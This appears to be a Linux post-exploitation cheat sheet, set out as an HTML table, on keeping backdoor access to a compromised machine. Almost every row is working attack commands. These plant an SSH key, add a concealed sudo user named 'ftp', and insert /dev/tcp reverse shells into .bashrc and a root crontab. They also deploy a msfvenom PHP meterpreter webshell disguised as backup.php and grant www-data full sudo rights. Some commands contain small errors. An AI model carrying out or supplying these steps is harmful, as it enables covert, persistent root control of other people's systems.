## Linux Security :

 Maintain remote access / backdoor to remote systems: 
<table style="width:100%" >



<tr>
<th>command</th>
<th>description <br /></th>
<th>reference <br /></th>
</tr>

<tr>
<th>maintain access</th>
<td>generate ssh key & maintain backdoor <br /></td>
<td>$ ssh-keygen -t rsa <br />
> /root/.ssh/godseye (name it godseye and put it in root) <br />
§ ls <br />
$ cat evil <br />
$ cat evil.pub <br />
$ ssh-copy-id -i godseye.pub user@ip <br />
$ ssh -i godseye user@ip <br />
$ sudo su <br />
$ cd .ssh/ <br />
$ ls <br />
$ cat authorized_keys <br /></td>
</tr>


<tr>
<th>ssh configuration</th>
<td>modify ssh configuration<br /></td>
<td>$ nano /etc/ssh/sshd_config (RSAAuthentication should be yes to login without password)<br /></td>
</tr>

<tr>
<th>adding a sneaky user</th>
<td>Adding a sneaky user in remote<br /></td>

<td>$ sudo su<br />
$ cd .. (go to home folder)<br />
$ ls<br />
$ useradd -m -s /bin/bash ftp<br />
$ usermod -aG sudo ftp<br />
$ passwd ftp<br />
$ ssh ftp@ip<br /></td>
</tr>

<tr>
<th>bashrc profile</th>
<td>modify ssh configuration<br /></td>
<td>$ ssh ftp@ip<br />
$ cd .. (go to home folder)<br />
$ nano user/.bashrc<br />
$ sh -i >& /dev/tcp/192.168.177.45/9000 0>&1 (put in a sneaky command)<br />
$ nc -lvp 9000 (from local system and anytime a user logs into remote we get an ip)<br />
</td>
</tr>

<tr>
<th>cron tab in remote machine</th>
<td>getting a cron tab in remote machine to get a backdoor<br /></td>
<td>
$ sudo su (in remote)<br />
$ crontab -e (type '2' for nano)<br />
$ ***** /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.177.45/9000 0>&1 (add this cronjob)<br />
$ nc -nlvp 9000 (in local use netcat and we get a connection as root #)<br />
</td>
</tr>

<tr>
<th>use metasploit to get persistence in a system</th>
<td>webshell using msfvenom<br /></td>
<td>$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.177.45 LPORT=9001 -e php/base64 -f raw shell.php (create a web shell)<br />
$ ls <br />
$ nano shell.php <br />
$ create php code and $ cat shell.php (copy the code)<br />
$ sudo su (in remote) <br />
$ cd /var/www/html/ <br />
$ ls <br />
$ nano backup.php (paste the code)<br />
$ nano /etc/sudoers (in USER PRIVILEDGES add 'www-data ALL=(ALL:ALL) ALL for web server) <br />
$ passwd www-data (www-data user got access)<br />
$ msfconsole (in local) <br />
> use  multi/handler <br />
> set payload php/meterpreter/reverse_tcp <br />
> set lhost 192.168.177.45 <br />
> set lport 9001 <br />
> run <br />
$ curl 192.168.177.48/backup.php (from local shell)<br />
We get a meterpreter shell to remote host:<br />
> whoami <br />
</td>
</tr>

</table>